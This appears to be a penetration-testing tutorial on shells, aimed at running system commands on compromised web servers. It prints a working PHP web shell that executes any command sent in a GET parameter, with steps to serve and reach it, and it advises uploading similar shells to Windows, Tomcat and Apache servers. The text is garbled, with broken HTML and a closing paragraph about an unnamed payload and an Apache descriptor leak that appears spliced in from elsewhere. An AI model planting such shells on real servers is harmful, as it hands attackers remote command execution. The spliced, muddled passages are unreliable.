# Shells
Shell is the name for Bash terminal, but in penetration testing it also the common name of the program that allows you to execute commands on operating system. Depending on the programing language, shells differ from each other, but their purpose is always the same. They are used to extend program language execution to system command execution. Such a program when exploit web application is often named webshell. A web shell is a script writen in language that will executed by the server, there is no universal webshell, and you should have few awsome when apporach differnt applications.

If you are able to upload any file on the server, you should try ASP shell on Windows server. JSP shell on apache tomcat, and PHP shell on classic Apache. Constructing webshell is a fairly easy task, only basic functionality is needed. A form to allow you to type command, and program that take the logical command and execute it. Most programming add scripting languages in the possibility to interact with underlining operating system using them. There is dedicated funtion that needs language that allows you to do so. For example, `os.popen` in Python or `java.lang.getRuntime.exec` in java.

[Execute a system command](http://rosettacode.org/wiki/Execute_a_system_command)

Let's create a simple PHP webshell:

```php
<html>
<?php

echo "<form method=GET><input type=text name=cmd><input type=submit value=ok></$=ok></form>";
system($_GET["cmd"]);

?>
</html>
```

```
php -S 0.0.0.0:80
```

```
http://192.168.248.148/shell.php
```

The webshell is now running. We have also extended PHP to operating system command execution.

There are two kinds of TCP shells, bind and reverse shells.

Unfortunately, this payload can leave conspicuous evil-looking entries in the apache error logs, so it is probably a good idea to use a bind or reverse shell unless firewalls prevent them from working. The issue this payload takes advantage of (CLOEXEC flag not set on sockets) appears to have been patched on the Ubuntu version of Apache and may not work on other Debian-based distributions. Only tested on Apache but it might work on other web servers that leak file descriptors to child processes.
